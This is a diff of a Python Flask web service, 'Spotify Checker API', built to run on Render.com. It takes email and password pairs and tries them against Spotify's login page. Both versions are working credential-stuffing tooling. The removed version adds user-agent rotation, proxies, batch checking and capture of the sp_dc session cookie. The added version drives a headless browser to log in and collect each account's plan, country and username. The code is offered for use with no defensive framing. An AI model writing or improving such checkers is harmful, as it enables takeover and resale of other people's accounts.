@@ -1,329 +1,156 @@
 
 #!/usr/bin/env python3
 """
-SPOTIFY CHECKER API - For Render.com Deployment
-Accepts email:password combos and returns account info
+SPOTIFY CHECKER API FOR RENDER.COM
+Uses Playwright browser automation for reliable Spotify login
+DO NOT CONFUSE WITH LOCAL CHECKER - THIS GOES ON RENDER!
 """
 
 from flask import Flask, request, jsonify
-import requests
-import time
-import random
-import json
-import re
 import os
+import time
 from functools import wraps
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 
 app = Flask(__name__)
 
-# API Configuration - Read from environment variable
-API_KEY = os.environ.get('API_KEY', 'sk_live_abc123xyz7898724352678')  # Fallback key
-RATE_LIMIT = 100  # requests per minute
-
-# User agents for rotation
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-]
-
-# Simple rate limiting
+# Configuration from environment
+API_KEY = os.environ.get('API_KEY', 'sk_live_abc123xyz7898724352678')
+RATE_LIMIT = 100
 request_counts = {}
 
 def require_api_key(f):
-    """Decorator to require API key authentication"""
     @wraps(f)
     def decorated_function(*args, **kwargs):
         api_key = request.headers.get('X-API-Key')
-
-        # Debug logging
-        print(f"Received API Key: {api_key}")
-        print(f"Expected API Key: {API_KEY}")
-
         if not api_key or api_key != API_KEY:
-            return jsonify({
-                'success': False, 
-                'error': 'Invalid or missing API key',
-                'received': api_key[:10] + '...' if api_key else 'None',
-                'expected_prefix': API_KEY[:10] + '...'
-            }), 401
+            return jsonify({'success': False, 'error': 'Invalid API key'}), 401
         return f(*args, **kwargs)
     return decorated_function
 
 def rate_limit_check(ip):
-    """Simple rate limiting"""
     current_minute = int(time.time() / 60)
     key = f"{ip}:{current_minute}"
-
     if key in request_counts:
         if request_counts[key] >= RATE_LIMIT:
             return False
         request_counts[key] += 1
     else:
         request_counts[key] = 1
-
-    # Cleanup old entries
     for k in list(request_counts.keys()):
         if not k.endswith(str(current_minute)):
             del request_counts[k]
-
     return True
 
-class SpotifyAuthenticator:
-    """Handles Spotify authentication via web requests"""
-
-    def __init__(self, email, password, proxy=None):
+class SpotifyChecker:
+    def __init__(self, email, password):
         self.email = email
         self.password = password
-        self.proxy = proxy
-        self.session = requests.Session()
-        self.session.headers.update({
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://accounts.spotify.com",
-            "Referer": "https://accounts.spotify.com/en/login"
-        })
 
-    def get_csrf_token(self):
-        """Extract CSRF token from login page"""
+    def check(self):
         try:
-            response = self.session.get(
-                "https://accounts.spotify.com/en/login",
-                proxies=self.proxy,
-                timeout=15
-            )
+            with sync_playwright() as p:
+                browser = p.chromium.launch(
+                    headless=True,
+                    args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+                )
+                context = browser.new_context(
+                    viewport={'width': 1920, 'height': 1080},
+                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                )
+                page = context.new_page()
 
-            # Try to find csrf_token in response
-            match = re.search(r'"csrf_token":"([^"]+)"', response.text)
-            if match:
-                return match.group(1)
+                # Go to Spotify login
+                page.goto('https://accounts.spotify.com/en/login', timeout=30000)
+                page.wait_for_load_state('networkidle', timeout=10000)
 
-            match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
-            if match:
-                return match.group(1)
+                # Fill credentials
+                page.fill('input[id="login-username"]', self.email)
+                page.fill('input[id="login-password"]', self.password)
+                page.click('button[id="login-button"]')
 
-            return None
-        except Exception as e:
-            return None
+                # Wait for navigation
+                time.sleep(4)
+                current_url = page.url
 
-    def login(self):
-        """Attempt authentication"""
-        try:
-            # Get CSRF token
-            csrf_token = self.get_csrf_token()
+                # Check if still on login page (failed)
+                if 'login' in current_url:
+                    browser.close()
+                    return {'success': False, 'error': 'Invalid credentials'}
 
-            # Prepare login data
-            login_data = {
-                "username": self.email,
-                "password": self.password,
-                "remember": "true"
-            }
-
-            if csrf_token:
-                login_data["csrf_token"] = csrf_token
-
-            # Attempt login
-            response = self.session.post(
-                "https://accounts.spotify.com/login/password",
-                data=login_data,
-                proxies=self.proxy,
-                timeout=20,
-                allow_redirects=False
-            )
-
-            # Check for successful login via cookies
-            cookies = self.session.cookies
-            sp_dc = cookies.get('sp_dc')
-
-            if sp_dc:
-                # Try to get account info
-                account_info = self.get_account_info()
-                if account_info:
-                    return {
-                        'success': True,
-                        'email': self.email,
-                        'account_info': account_info,
-                        'sp_dc': sp_dc
-                    }
-
-            # Check response for errors
-            if response.status_code == 200:
+                # Success - get account info
                 try:
-                    data = response.json()
-                    if data.get('error'):
-                        return {'success': False, 'error': data.get('error')}
-                except:
-                    pass
+                    page.goto('https://www.spotify.com/api/account/v1/datalayer/', timeout=15000)
+                    page.wait_for_load_state('networkidle', timeout=10000)
 
-            # Check if redirected (successful login)
-            if response.status_code in [302, 303, 307]:
-                location = response.headers.get('Location', '')
-                if 'login' not in location:
-                    account_info = self.get_account_info()
+                    import json
+                    data_text = page.locator('pre').inner_text()
+                    account_data = json.loads(data_text)
+                    user = account_data.get('user', {})
+
+                    browser.close()
                     return {
                         'success': True,
                         'email': self.email,
-                        'account_info': account_info or {'product': 'unknown'}
+                        'account_info': {
+                            'email': user.get('email', self.email),
+                            'display_name': user.get('display_name', 'N/A'),
+                            'country': user.get('country', 'N/A'),
+                            'product': user.get('product', 'free'),
+                            'username': user.get('username', 'N/A')
+                        }
                     }
-
-            return {'success': False, 'error': 'Invalid credentials'}
-
-        except requests.exceptions.Timeout:
-            return {'success': False, 'error': 'Request timeout'}
+                except:
+                    browser.close()
+                    return {
+                        'success': True,
+                        'email': self.email,
+                        'account_info': {
+                            'email': self.email,
+                            'display_name': 'N/A',
+                            'country': 'N/A',
+                            'product': 'unknown'
+                        }
+                    }
         except Exception as e:
-            return {'success': False, 'error': str(e)}
-
-    def get_account_info(self):
-        """Get account information from Spotify API"""
-        try:
-            # Try to get account info from API
-            response = self.session.get(
-                "https://api.spotify.com/v1/me",
-                proxies=self.proxy,
-                timeout=15
-            )
-
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'email': data.get('email', self.email),
-                    'display_name': data.get('display_name', 'N/A'),
-                    'country': data.get('country', 'N/A'),
-                    'product': data.get('product', 'free'),
-                    'followers': data.get('followers', {}).get('total', 0),
-                    'uri': data.get('uri', 'N/A')
-                }
-
-            # Alternative: Try to get from web endpoint
-            response = self.session.get(
-                "https://www.spotify.com/api/account/v1/datalayer/",
-                proxies=self.proxy,
-                timeout=15
-            )
-
-            if response.status_code == 200:
-                data = response.json()
-                user_data = data.get('user', {})
-                return {
-                    'email': self.email,
-                    'display_name': user_data.get('display_name', 'N/A'),
-                    'country': user_data.get('country', 'N/A'),
-                    'product': user_data.get('product', 'free'),
-                }
-
-            return None
-
-        except Exception:
-            return None
-
-# API Routes
+            return {'success': False, 'error': f'Browser error: {str(e)}'}
 
 @app.route('/')
 def index():
-    """API info page"""
     return jsonify({
         'name': 'Spotify Checker API',
-        'version': '1.0',
+        'version': '2.0',
         'status': 'online',
-        'api_key_configured': bool(API_KEY),
-        'endpoints': {
-            '/check': 'POST - Check single account',
-            '/batch': 'POST - Check multiple accounts',
-            '/health': 'GET - Health check'
-        },
-        'authentication': 'X-API-Key header required'
+        'method': 'Browser automation (Playwright)',
+        'endpoints': {'/check': 'POST', '/health': 'GET'}
     })
 
 @app.route('/health')
 def health():
-    """Health check endpoint"""
-    return jsonify({
-        'status': 'healthy', 
-        'timestamp': time.time(),
-        'api_key_set': bool(API_KEY)
-    })
+    return jsonify({'status': 'healthy', 'timestamp': time.time()})
 
 @app.route('/check', methods=['POST'])
 @require_api_key
 def check_account():
-    """Check single Spotify account"""
     ip = request.remote_addr
-
-    # Rate limiting
     if not rate_limit_check(ip):
         return jsonify({'success': False, 'error': 'Rate limit exceeded'}), 429
 
     data = request.json
     if not data:
-        return jsonify({'success': False, 'error': 'Invalid request body'}), 400
+        return jsonify({'success': False, 'error': 'Invalid request'}), 400
 
     email = data.get('email')
     password = data.get('password')
-    proxy = data.get('proxy')  # Optional
 
     if not email or not password:
         return jsonify({'success': False, 'error': 'Email and password required'}), 400
 
-    # Format proxy if provided
-    proxy_dict = None
-    if proxy:
-        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
-            proxy = f"http://{proxy}"
-        proxy_dict = {'http': proxy, 'https': proxy}
-
-    # Authenticate
-    authenticator = SpotifyAuthenticator(email, password, proxy_dict)
-    result = authenticator.login()
-
+    checker = SpotifyChecker(email, password)
+    result = checker.check()
     return jsonify(result)
-
-@app.route('/batch', methods=['POST'])
-@require_api_key
-def check_batch():
-    """Check multiple accounts (max 10 per request)"""
-    ip = request.remote_addr
-
-    if not rate_limit_check(ip):
-        return jsonify({'success': False, 'error': 'Rate limit exceeded'}), 429
-
-    data = request.json
-    if not data or 'accounts' not in data:
-        return jsonify({'success': False, 'error': 'Invalid request body'}), 400
-
-    accounts = data.get('accounts', [])
-
-    if not accounts or len(accounts) == 0:
-        return jsonify({'success': False, 'error': 'No accounts provided'}), 400
-
-    if len(accounts) > 10:
-        return jsonify({'success': False, 'error': 'Maximum 10 accounts per batch'}), 400
-
-    results = []
-
-    for account in accounts:
-        email = account.get('email')
-        password = account.get('password')
-
-        if not email or not password:
-            results.append({
-                'email': email or 'unknown',
-                'success': False,
-                'error': 'Missing credentials'
-            })
-            continue
-
-        authenticator = SpotifyAuthenticator(email, password)
-        result = authenticator.login()
-        results.append(result)
-
-        # Small delay between checks
-        time.sleep(0.5)
-
-    return jsonify({'success': True, 'results': results})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"Starting API with key: {API_KEY[:10]}...")
+    print(f"Spotify Checker API (Playwright) running on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
